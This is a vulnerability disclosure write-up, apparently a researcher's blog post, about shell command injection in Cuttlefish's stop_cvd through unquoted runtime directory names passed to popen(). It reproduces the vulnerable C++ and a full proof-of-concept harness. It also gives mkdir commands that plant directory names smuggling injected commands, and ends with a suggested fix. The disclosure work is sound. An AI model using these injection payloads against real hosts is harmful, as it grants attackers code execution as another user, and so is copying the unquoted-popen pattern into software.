% Cuttlefish stop_cvd: shell command injection via unquoted runtime directory names in popen()
% bllry
% 2026-09-20

<!-- gif goes here -->
<p><img src="" alt="" border="0"></p>

Reported to the Google [Android & Devices VRP](https://bughunters.google.com/about/rules/6171833274204160/android-and-google-devices-security-reward-program-rules).
Affected repository: [google/android-cuttlefish](https://github.com/google/android-cuttlefish).

`stop_cvd` / `cvd stop` builds an `lsof` command line by string-concatenating
candidate runtime directory names into a shell string with no quoting or
validation, then executes it with `popen()`, which invokes `/bin/sh -c`. The
directory set is discovered by scanning `$HOME` for entries starting with
`cuttlefish_runtime.`, so anyone able to create a directory in the target
user's `$HOME` achieves arbitrary command execution as the user running
`stop_cvd`.

- **Commit:** `b1c733f554a34b24196153ce71a34d0faa1b94c8`
- **File:** `base/cvd/cuttlefish/host/commands/stop/main.cc`

## Vulnerable code

Sink &mdash; unquoted concatenation into `/bin/sh -c`:

```cpp
std::set<pid_t> GetCandidateProcessGroups(const std::set<std::string>& dirs) {
  std::stringstream cmd;
  cmd << "lsof -t 2>/dev/null";
  for (const auto& dir : dirs) {
    cmd << " +D " << dir;                          // dir NOT shell-quoted
  }
  std::string cmd_str = cmd.str();
  std::shared_ptr<FILE> cmd_out(popen(cmd_str.c_str(), "r"), pclose);   // /bin/sh -c
  ...
}
```

Source &mdash; `$HOME` scan with only a prefix check:

```cpp
std::string parent_path = StringFromEnv("HOME", ".");
paths.insert(parent_path + "/cuttlefish_assembly");
...
std::string subdir(entity->d_name);
if (!absl::StartsWith(subdir, "cuttlefish_runtime.")) { continue; }
paths.insert(parent_path + "/" + subdir);
```

The only validation on `subdir` is the `cuttlefish_runtime.` prefix. The rest of
the directory name is passed unmodified into the shell string. Filenames may
contain arbitrary bytes except `NUL` and `/`, which is sufficient for shell
injection (`;`, `$(...)`, `` ` ` ``, `${IFS}`, etc.).

## Reachability

Two paths reach the sink:

1. **Fallback path.** `StopCvdMain` invokes `FallBackStop(FallbackDirs())`
   whenever no valid config is loaded:

   ```cpp
   auto config = CuttlefishConfig::Get();
   if (!config) { return FallBackStop(FallbackDirs()); }
   ```

   A bare `stop_cvd` / `cvd stop` invocation with no active instance scans
   `$HOME` and calls the vulnerable sink.

2. **Instance path.** `StopInstance` reaches the same
   `GetCandidateProcessGroups` sink via `DirsForInstance` when a clean stop over
   the launcher socket fails.

## Root cause

`popen()` executes its argument with `/bin/sh -c`. Any directory name
containing shell metacharacters becomes shell input. Because directory names are
attacker-influenced, anyone with write access to the target user's `$HOME` can
`mkdir` an arbitrary name with the required prefix, and since the concatenation
performs no quoting or metacharacter filtering, the shell interprets the
injected substrings as commands.

The one constraint is that a directory name cannot contain `/`. But `;cmd`,
`$(cmd)`, `` `cmd` ``, `${IFS}` for spaces, and relative-path writes all satisfy
that, giving full arbitrary command execution with attacker-controlled `argv`.

## Impact

Any environment where a lower-trust actor can create a directory in the `$HOME`
of the user that runs `stop_cvd` / `cvd stop`:

- Shared or group-writable `$HOME`.
- The Cuttlefish service user's `$HOME` being writable, whether directly or
  transitively by another local account or by a process reachable through
  another interface.
- A prior malicious `launch_cvd` (or any other flow that lets an actor influence
  instance directory names under `$HOME`) planting a directory that persists
  until the next `stop_cvd` run by a higher-privileged account.
- Any orchestrator/automation path that runs `stop_cvd` as a service user over a
  shared `$HOME`.

In packaged deployments the Cuttlefish service user is a member of `kvm`,
`cvdnetwork`, and `render`, so execution inherits VM control and host networking
privileges.

## Proof of concept

Tested on Debian 13 x86_64, commit `b1c733f554a34b24196153ce71a34d0faa1b94c8`.
The harness compiles `FallbackDirs()` and `GetCandidateProcessGroups()`
**verbatim** from `base/cvd/cuttlefish/host/commands/stop/main.cc:60-101`. The
only substitutions are `absl::StartsWith` -> `std::string::rfind` and
`LOG(ERROR)` -> `fprintf` &mdash; neither of which touches the vulnerable sink.

**1. Save the harness:**

```cpp
// stopcvd_repro.cc
#include <dirent.h>
#include <stdio.h>
#include <cstdint>
#include <cinttypes>
#include <memory>
#include <set>
#include <sstream>
#include <string>
static bool StartsWith(const std::string& s, const std::string& p){ return s.rfind(p,0)==0; }
std::set<std::string> FallbackDirs(){
  std::set<std::string> paths;
  std::string parent_path = getenv("HOME") ? getenv("HOME") : ".";
  paths.insert(parent_path + "/cuttlefish_assembly");
  std::unique_ptr<DIR,int(*)(DIR*)> dir(opendir(parent_path.c_str()), closedir);
  if(!dir) return paths;
  for(auto e=readdir(dir.get()); e; e=readdir(dir.get())){
    std::string subdir(e->d_name);
    if(!StartsWith(subdir,"cuttlefish_runtime.")) continue;
    paths.insert(parent_path + "/" + subdir);
  }
  return paths;
}
void GetCandidateProcessGroups(const std::set<std::string>& dirs){
  std::stringstream cmd; cmd << "lsof -t 2>/dev/null";
  for(const auto& d : dirs) cmd << " +D " << d;
  std::string cmd_str = cmd.str();
  fprintf(stderr,"[popen string] %s\n\n", cmd_str.c_str());
  std::shared_ptr<FILE> out(popen(cmd_str.c_str(),"r"), pclose);
}
int main(){ GetCandidateProcessGroups(FallbackDirs()); return 0; }
```

**2. Build:**

```bash
g++ -std=c++17 -o stopcvd_repro stopcvd_repro.cc
```

**3. Plant malicious runtime directories (attacker):**

```bash
export FAKEHOME=/tmp/cf-poc/home
export WORK=/tmp/cf-poc/cwd
mkdir -p "$FAKEHOME" "$WORK"

# command-substitution form
mkdir -p "$FAKEHOME/cuttlefish_runtime.\$(id>PWNED_subst)"

# semicolon-chaining form
mkdir -p "$FAKEHOME/cuttlefish_runtime.;id>PWNED_semi;"
```

**4. Trigger the vulnerable path (victim).** This mirrors `StopCvdMain`'s
fallback path: a `stop_cvd` invocation with no active instance config calls
`FallBackStop(FallbackDirs())`, which scans `$HOME` and passes the result to
`GetCandidateProcessGroups`.

```bash
( cd "$WORK" && HOME="$FAKEHOME" ./stopcvd_repro )
```

**5. Look at the injected popen string (stderr):**

```
[popen string] lsof -t 2>/dev/null +D /tmp/cf-poc/home/cuttlefish_assembly +D /tmp/cf-poc/home/cuttlefish_runtime.$(id>PWNED_subst) +D /tmp/cf-poc/home/cuttlefish_runtime.;id>PWNED_semi;
```

Both payloads are embedded verbatim in the string passed to `/bin/sh -c`.

**6. Confirm execution:**

```bash
cat "$WORK/PWNED_subst" "$WORK/PWNED_semi"
```

Both files contain the output of `id`, written by the injected commands:

```
uid=1000(lily) gid=1000(lily) groups=1000(lily),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),102(scanner),106(bluetooth),108(lpadmin),986(docker)
```

The manual run, end to end:

![Manual stop_cvd injection PoC: planting dirs, running the harness, and the injected commands dropping files](/blogs/android1.png)

A packaged run of the same PoC (`demo-2.sh`), confirming RCE with a summary of
the sink, source, and impact:

![Packaged demo-2.sh run ending in RCE CONFIRMED with a source/sink/impact summary](/blogs/android2.png)

## Affected version

Host-tool vulnerability, not a device OS issue &mdash; no Android guest image or
physical device is required to reproduce.

- Vulnerable component: AOSP `device/google/cuttlefish` host tools
- Affected commit: `b1c733f554a34b24196153ce71a34d0faa1b94c8`
- Host OS: Debian 13 x86_64, kernel 6.12.105+deb13-amd64
- Compiler: x86_64-linux-gnu-gcc-14 (Debian 14.2.0-19) 14.2.0

## Suggested fix

Shell-quote each directory before concatenation, or avoid the shell entirely by
running `lsof` via `execvp()` with an argument vector instead of `popen()`.
Prefix validation is not a substitute for quoting: any name that survives the
`cuttlefish_runtime.` check can still carry shell metacharacters.
